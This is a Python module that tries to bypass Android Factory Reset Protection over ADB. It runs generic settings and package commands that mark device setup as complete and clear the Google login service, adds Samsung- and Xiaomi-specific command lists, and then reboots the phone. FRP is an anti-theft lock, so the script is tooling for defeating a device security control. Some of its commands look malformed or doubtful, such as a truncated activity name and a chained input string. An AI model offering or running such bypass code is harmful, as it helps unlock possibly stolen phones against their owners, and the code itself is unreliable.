from .utils import run_adb_command, is_frp_locked, get_device_model, detect_brand

def adb_remove_frp():
    """Attempt to remove FRP via ADB (requires USB debugging)."""
    print("[*] Checking FRP status...")
    if not is_frp_locked():
        print("[+] FRP is already disabled!")
        return True

    print("[*] Attempting ADB FRP bypass...")
    model = get_device_model()
    brand = detect_brand(model)

    # Universal ADB FRP bypass (works on some devices)
    commands = [
        "shell content insert --uri content://settings/system --bind name:s:user_setup_complete --bind value:i:1",
        "shell am start -n com.google.android.gsf.login/",
        "shell am start -n com.google.android.gsf.login.LoginActivity",
        "shell settings put global device_provisioned 1",
        "shell am force-stop com.google.android.gsf.login",
        "shell pm clear com.google.android.gsf.login",
        "shell reboot"
    ]

    for cmd in commands:
        print(f"[*] Executing: {cmd}")
        output = run_adb_command(cmd)
        if "error" in output.lower():
            print(f"[-] Failed: {cmd}")

    # Brand-specific ADB commands
    if brand == "samsung":
        print("[*] Applying Samsung-specific ADB bypass...")
        samsung_commands = [
            "shell am start -n com.samsung.android.app.spage/.settings.FrpResetActivity",
            "shell am start -n com.sec.android.app.sbrowser/.BrowserActivity --es url https://accounts.google.com",
            "shell input text 'test@gmail.com' && shell input keyevent 66"
        ]
        for cmd in samsung_commands:
            run_adb_command(cmd)

    elif brand == "xiaomi":
        print("[*] Applying Xiaomi-specific ADB bypass...")
        xiaomi_commands = [
            "shell am start -n com.miui.systemAdSolution/.MainActivity",
            "shell settings put global miui.activation_code ''"
        ]
        for cmd in xiaomi_commands:
            run_adb_command(cmd)

    print("[*] Rebooting device...")
    run_adb_command("reboot")
    print("[+] ADB FRP bypass attempt complete. Check device after reboot.")
    return True